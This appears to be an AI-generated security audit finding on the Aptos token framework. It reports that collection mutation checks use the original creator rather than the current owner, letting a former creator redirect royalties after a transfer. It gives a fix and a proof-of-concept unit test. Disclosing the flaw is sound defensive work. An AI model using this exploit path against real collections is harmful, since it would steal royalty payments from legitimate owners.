The code path is clear. Let me verify the exact `royalty::update` function to complete the trace.

The full exploit path is confirmed. The vulnerability is real.

---

### Title
Original Collection Creator Retains Unauthorized Royalty Mutation Rights After Ownership Transfer — (`aptos-move/framework/aptos-token-objects/sources/aptos_token.move`)

### Summary

`authorized_borrow_collection` in `aptos_token.move` gates all collection mutation functions — including `set_collection_royalties_call` — on the immutable `Collection.creator` field rather than the current object owner. When the `collection_owner` feature is enabled and a collection is transferred to a new owner, the original creator retains the ability to overwrite the `Royalty.payee_address`, redirecting all future royalty payments to themselves.

### Finding Description

The `collection_owner` feature (feature flag 79) was introduced to allow collection objects to be transferred, explicitly documented as transferring "ownership and minting permissions to the new address." [1](#0-0) 

Collections created via `create_fixed_collection_as_owner` or `create_unlimited_collection_as_owner` have ungated transfer enabled, allowing `object::transfer` to change `ObjectCore.owner` to a new address. [2](#0-1) 

However, `authorized_borrow_collection` in `aptos_token.move` checks `collection::creator(*collection)` — which reads the immutable `creator` field stored in the `Collection` struct at creation time — rather than the current object owner: [3](#0-2) 

`collection::creator()` simply returns `borrow(&collection).creator`, which is set once at construction and never updated: [4](#0-3) [5](#0-4) 

This means after a collection is transferred, the original creator still passes the `authorized_borrow_collection` check and can call `set_collection_royalties_call` to invoke `royalty::update`, which unconditionally overwrites the `Royalty` resource (including `payee_address`) at the collection's object address: [6](#0-5) [7](#0-6) 

By contrast, the token minting path under the same feature correctly uses `collection.owner()` for authorization: [8](#0-7) 

### Impact Explanation

After selling a collection (transferring it to a buyer), the original creator can call `set_collection_royalties_call` with their own address as `payee_address`. All subsequent royalty payments on token sales from that collection — which marketplaces read from `Royalty.payee_address` — are redirected to the attacker. This is direct, unauthorized theft of on-chain royalty revenue from the new legitimate collection owner.

### Likelihood Explanation

The `collection_owner` feature is a production feature (not experimental/out-of-scope) and is the explicit mechanism for collection marketplace sales. Any collection sold via this mechanism is immediately vulnerable. The attacker is the original creator — an unprivileged account — calling a public entry function with no special capabilities required beyond knowing the collection object address.

### Recommendation

Replace the `collection::creator()` check in `authorized_borrow_collection` with a current-owner check when the `collection_owner` feature is enabled:

```move
inline fun authorized_borrow_collection<T: key>(collection: &Object<T>, creator: &signer): &AptosCollection {
    let collection_address = collection.object_address();
    assert!(exists<AptosCollection>(collection_address), error::not_found(ECOLLECTION_DOES_NOT_EXIST));
    if (features::is_collection_owner_enabled()) {
        assert!(collection.owner() == signer::address_of(creator), error::permission_denied(ENOT_CREATOR));
    } else {
        assert!(collection::creator(*collection) == signer::address_of(creator), error::permission_denied(ENOT_CREATOR));
    };
    &AptosCollection[collection_address]
}
```

The same fix should be applied to `set_collection_description` and `set_collection_uri` which use the same `authorized_borrow_collection` helper. [9](#0-8) [10](#0-9) 

### Proof of Concept

```move
#[test(creator = @0x123, buyer = @0x456, aptos_framework = @aptos_framework)]
fun test_royalty_theft_after_collection_transfer(
    creator: &signer,
    buyer: &signer,
    aptos_framework: &signer,
) acquires AptosCollection {
    // Enable collection_owner feature
    features::change_feature_flags_for_testing(
        aptos_framework,
        vector[features::get_collection_owner_feature()],
        vector[],
    );

    // Creator creates a transferable collection with mutable royalties
    let collection = create_collection_object(
        creator,
        utf8(b"desc"), 100, utf8(b"MyCollection"), utf8(b"uri"),
        /*mutable_royalty=*/true,
        /*...other flags...*/false, false, false, false, false, false, false, false,
        1, 100,
    );

    // Buyer purchases the collection (transfers ownership)
    object::transfer(creator, collection, signer::address_of(buyer));
    assert!(collection.owner() == signer::address_of(buyer), 0);

    // Original creator redirects royalties to themselves — should FAIL but SUCCEEDS
    set_collection_royalties_call(
        creator,
        collection,
        10, 100,
        signer::address_of(creator), // attacker's address as payee
    );

    // Royalty payee is now the original creator, not the buyer
    let royalty = royalty::get(collection).extract();
    assert!(royalty::payee_address(&royalty) == signer::address_of(creator), 1);
    // Buyer's royalties have been stolen
}
```

### Citations

**File:** aptos-move/framework/aptos-token-objects/sources/collection.move (L216-218)
```text
    /// Same functionality as `create_fixed_collection`, but the caller is the owner of the collection.
    /// This means that the caller can transfer the collection to another address.
    /// This transfers ownership and minting permissions to the new address.
```

**File:** aptos-move/framework/aptos-token-objects/sources/collection.move (L219-239)
```text
    public fun create_fixed_collection_as_owner(
        creator: &signer,
        description: String,
        max_supply: u64,
        name: String,
        royalty: Option<Royalty>,
        uri: String,
    ): ConstructorRef {
        assert!(features::is_collection_owner_enabled(), error::unavailable(ECOLLECTION_OWNER_NOT_SUPPORTED));

        let constructor_ref = create_fixed_collection(
            creator,
            description,
            max_supply,
            name,
            royalty,
            uri,
        );
        enable_ungated_transfer(&constructor_ref);
        constructor_ref
    }
```

**File:** aptos-move/framework/aptos-token-objects/sources/collection.move (L331-333)
```text
        let collection = Collection {
            creator: signer::address_of(creator),
            description,
```

**File:** aptos-move/framework/aptos-token-objects/sources/collection.move (L588-590)
```text
    public fun creator<T: key>(collection: Object<T>): address acquires Collection {
        borrow(&collection).creator
    }
```

**File:** aptos-move/framework/aptos-token-objects/sources/aptos_token.move (L607-618)
```text
    inline fun authorized_borrow_collection<T: key>(collection: &Object<T>, creator: &signer): &AptosCollection {
        let collection_address = collection.object_address();
        assert!(
            exists<AptosCollection>(collection_address),
            error::not_found(ECOLLECTION_DOES_NOT_EXIST),
        );
        assert!(
            collection::creator(*collection) == signer::address_of(creator),
            error::permission_denied(ENOT_CREATOR),
        );
        &AptosCollection[collection_address]
    }
```

**File:** aptos-move/framework/aptos-token-objects/sources/aptos_token.move (L620-631)
```text
    public entry fun set_collection_description<T: key>(
        creator: &signer,
        collection: Object<T>,
        description: String,
    ) acquires AptosCollection {
        let aptos_collection = authorized_borrow_collection(&collection, creator);
        assert!(
            aptos_collection.mutable_description,
            error::permission_denied(EFIELD_NOT_MUTABLE),
        );
        collection::set_description(aptos_collection.mutator_ref.borrow(), description);
    }
```

**File:** aptos-move/framework/aptos-token-objects/sources/aptos_token.move (L646-655)
```text
    entry fun set_collection_royalties_call<T: key>(
        creator: &signer,
        collection: Object<T>,
        royalty_numerator: u64,
        royalty_denominator: u64,
        payee_address: address,
    ) acquires AptosCollection {
        let royalty = royalty::create(royalty_numerator, royalty_denominator, payee_address);
        set_collection_royalties(creator, collection, royalty);
    }
```

**File:** aptos-move/framework/aptos-token-objects/sources/aptos_token.move (L657-668)
```text
    public entry fun set_collection_uri<T: key>(
        creator: &signer,
        collection: Object<T>,
        uri: String,
    ) acquires AptosCollection {
        let aptos_collection = authorized_borrow_collection(&collection, creator);
        assert!(
            aptos_collection.mutable_uri,
            error::permission_denied(EFIELD_NOT_MUTABLE),
        );
        collection::set_uri(aptos_collection.mutator_ref.borrow(), uri);
    }
```

**File:** aptos-move/framework/aptos-token-objects/sources/royalty.move (L45-53)
```text
    public fun update(mutator_ref: &MutatorRef, royalty: Royalty) acquires Royalty {
        let addr = mutator_ref.inner.address_from_extend_ref();
        if (exists<Royalty>(addr)) {
            move_from<Royalty>(addr);
        };

        let signer = mutator_ref.inner.generate_signer_for_extending();
        move_to(&signer, royalty);
    }
```

**File:** aptos-move/framework/aptos-token-objects/sources/token.move (L186-188)
```text
        assert!(features::is_collection_owner_enabled(), error::unavailable(ECOLLECTION_OWNER_NOT_SUPPORTED));
        assert!(collection.owner() == signer::address_of(owner), error::unauthenticated(ENOT_OWNER));

```
